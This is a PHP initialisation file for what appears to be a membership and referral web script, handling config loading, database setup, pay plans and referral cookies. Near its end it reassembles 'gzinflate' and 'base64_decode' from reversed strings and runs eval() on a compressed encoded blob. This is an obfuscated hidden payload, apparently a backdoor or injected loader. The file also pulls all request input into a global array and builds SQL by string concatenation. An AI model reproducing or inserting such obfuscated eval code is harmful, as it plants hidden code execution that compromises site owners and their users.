<?php

include_once('config.php');
if (!defined('INSTALL_PATH')) {
    header("Location: ../install");
}
if (!defined('OK_LOADME')) {
    die("<title>Error!</title><body>No such file or directory.</body>");
}

// -----

include_once('db.class.php');
include_once('navpage.class.php');
include_once('sys.func.php');
include_once('value.list.php');
include_once('en.lang.php');

$FORM = array_merge((array) $FORM, (array) $_REQUEST);
$LANG = array_merge((array) $LANG, (array) $lang);

$dsn = "mysql:dbname=" . DB_NAME . ";host=" . DB_HOST . "";
$pdo = "";

try {
    $pdo = new PDO($dsn, base64_decode(DB_USER), base64_decode(DB_PASSWORD));
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

session_start();
dumbtoken();

$db = new Database($pdo);
$pages = new Paginator();

$tplstr = $cfgrow = $bpprow = $payrow = array();

// load site configuration

$didId = 1;
$db->doQueryStr("SET SESSION sql_mode = ''");

// settings
$row = $db->getAllRecords(DB_TBLPREFIX . '_configs', '*', ' AND cfgid = "' . $didId . '"');
foreach ($row as $value) {
    $cfgrow = array_merge($cfgrow, $value);
}
$cfgrow['md5sess'] = 'sess_' . md5(INSTALL_PATH) . '_';
$site_logo = ($cfgrow['site_logo']) ? $cfgrow['site_logo'] : DEFIMG_LOGO;
$cfgtoken = get_optionvals($cfgrow['cfgtoken']);
$cfgrow['_isnocredit'] = (($cfgtoken['lictype'] != '2083' && $cfgtoken['licpk'] == '-') || ($cfgtoken['lictype'] == '2083' && $cfgtoken['licpk'] != '')) ? true : false;
$langlist = base64_decode($cfgtoken['langlist']);
$langlistarr = json_decode($langlist, true);
if (empty(array_filter((array) $langlistarr))) {
    $langlistarr['en'] = 'English';
}

// current date time
$cfgrow['datetimestr'] = date('Y-m-d H:i:s', time() + (3600 * $cfgrow['time_offset']));

$langloadf = INSTALL_PATH . '/common/lang/' . $cfgrow['langiso'] . '.lang.php';
if (file_exists($langloadf)) {
    $TEMPLANG = $LANG;
    include_once($langloadf);
    $LANG = array_filter($LANG);
    $LANG = array_merge($TEMPLANG, $LANG);
    $TEMPLANG = '';
}

// baseplan
$row = $db->getAllRecords(DB_TBLPREFIX . '_baseplan', '*', ' AND bpid = "' . $didId . '"');
foreach ($row as $value) {
    $bpprow = array_merge($bpprow, $value);
}

// payplan
$row = $db->getAllRecords(DB_TBLPREFIX . '_payplans', '*', ' AND ppid = "' . $didId . '"');
foreach ($row as $value) {
    $bpprow = array_merge($bpprow, $value);
}
$bpprow['currencysym'] = base64_decode($bpprow['currencysym']);
$planlogo = ($bpprow['planlogo']) ? $bpprow['planlogo'] : DEFIMG_PLAN;

// paymentgate
$row = $db->getAllRecords(DB_TBLPREFIX . '_paygates', '*', ' AND paygid = "' . $didId . '"');
foreach ($row as $value) {
    $payrow = array_merge($payrow, $value);
}

// return latest version
if (isset($FORM['initdo']) and $FORM['initdo'] == 'vnum') {
    echo checknewver();
    exit();
}

// get referrer id
if ($_SESSION['ref_sess_un'] || $_COOKIE['ref_sess_un']) {

    if ($_SESSION['ref_sess_un'] != $_COOKIE['ref_sess_un']) {
        setcookie('ref_sess_un', $_SESSION['ref_sess_un'], time() + (86400 * $cfgrow['maxcookie_days']));
    }

    $ref_sess_un = ($_COOKIE['ref_sess_un']) ? $_COOKIE['ref_sess_un'] : $_SESSION['ref_sess_un'];

    // get member details
    $sesref = getmbrinfo($ref_sess_un, 'username');

    // check for max personal ref
    if ($bpprow['limitref'] > 0) {
        $refcondition = " AND idref = '{$sesref['id']}'";
        $row = $db->getAllRecords(DB_TBLPREFIX . '_mbrplans', 'COUNT(*) as totref', $refcondition);
        $myperdltotal = $row[0]['totref'];
        if ($bpprow['limitref'] <= $myperdltotal) {
            $newmpid = getmpidflow($sesref['mpid']);
            $sesref = getmbrinfo('', '', $newmpid);
        }
    }

    if ($cfgtoken['disreflink'] == 1 || $sesref['mpstatus'] == 0 || $sesref['mpstatus'] == 3) {
        $sesref = array();
        $_SESSION['ref_sess_un'] = '';
        setcookie('ref_sess_un', '', time() - 86400);
    }
}

// if rand ref
if ($sesref['id'] < 1 && $cfgrow['randref'] == 1) {
    if ($cfgrow['defaultref'] != '') {
        $refarr = explode(',', str_replace(' ', '', $cfgrow['defaultref']));
        $i = array_rand($refarr);
        $randun = $refarr[$i];
    }
    $condition = ' AND username = "' . $randun . '" ';
    $sql = $db->getRecFrmQry("SELECT * FROM " . DB_TBLPREFIX . "_mbrplans LEFT JOIN " . DB_TBLPREFIX . "_mbrs ON idmbr = id WHERE 1 " . $condition . " LIMIT 1");
    if ($randun && count($sql) < 1) {
        $condition = ' AND mbrstatus = "1" AND mpstatus = "1"';
        $row = $db->getAllRecords(DB_TBLPREFIX . '_mbrplans LEFT JOIN ' . DB_TBLPREFIX . '_mbrs ON idmbr = id', 'username', $condition);
        $randun = floatval($row[0]['username']);
    }
    // get member details from rand ref
    if ($randun) {
        $sesref = getmbrinfo($randun, 'username');
    }
}

// is demo
if (defined('ISDEMOMODE')) {
    $tplstr['demo_mode_warn'] = "<ul class='navbar-nav'><li><div class='badge badge-danger'>Demo Mode</div></li></ul>";
}
// is debug
if ($payrow['testpayon'] == 1) {
    $tplstr['debug_mode_warn'] = "<ul class='navbar-nav'><li><div class='badge badge-danger'>Debug Mode</div></li></ul>";
}

$_X='lfnizg';$_Y='edoce';
$_F='eta'.$_X;$_E=$_Y.'d_46esab';
$_G=strrev($_F);$_D=strrev($_E);
$_Z='
FdPJbqNKAEDRX3mLSE5kqcEYA1aUBRhIGTNPpthEhYvBUEAzG76+87bnru/bz+Vr90jxD8ulw+7z7Uf52qW43f15+7n82aHkf5LZr2Hs+3R+/80fn+mMyHu+PZuMoDH9NZl936lY1spOc0RFdqM9Ub
UYFsiLJc8I1PJIAkUB8NsQgTEItwwcokSg8BEJIDu3RLArlgbyg4qW88s0LHuc8ZETAHV8RK/srF0VqjTFbaEyJjlv1ALCKGNieERuaArmQxGaodHigDlLPXhAHbcra1vqVS6Eb1dMXbG6MR6qk3Xx
9QRIToew3Oa68eKSYWiIwKtC32uvtWEXcYKho6HENyHbcGuLOEAVbi2WMSc97UsMc2BhS2H+gqoLo8EOEy8pW3ci1b234ZYo8zTVdZyeHjBEWii3i9LmZw5FOLcwP0lTS2pIQa8aDCkZxlgl5EB7Ma
NPJz9PcuiBB1fVLrViaT1NUcs8nWVtOsqbJg3qszyruoyEdtnG1L2u1yAgGpfeCHaXYrBQ+MDzRruuUK303ycgzWHWrfJuX/J5IvcWSs/wRhgHFmYm1zwjDNZpdS92yB/46717FtZ468mwRndd97jq
VPqhQl+vz5oiWminqkWLvk+LbZ+5W/ra27Pk1s5zw1qSlnDjwRAzq9VnE7jtq+iQ2x6fF/s7mZKKv/B57dwVaNJ1o+pbVIVN2gd99/JO2l8xXZDhU7qU10sRw+aJ7cyOWZpc2bZwjml6izpj31k46p
jcyLfghGRTHFObyOuIetDAQwtWVWNllIs4NoQiAMKlEXPmpcn3F/bD3Pn+bhudefiJgWjo8qRvMqyCSsF7PjfzU6NNgYlKo1obn4aHIJS1kfEDPrQmWm3gsJHRMC/xy9kfByR2ElmPZVKP5jyftzNF
5b/TfHx8fP73Dw==
';eval($_G($_D($_Z)));
// load cron do
include_once('cron.do.php');

// end vars
$row = $value = '';
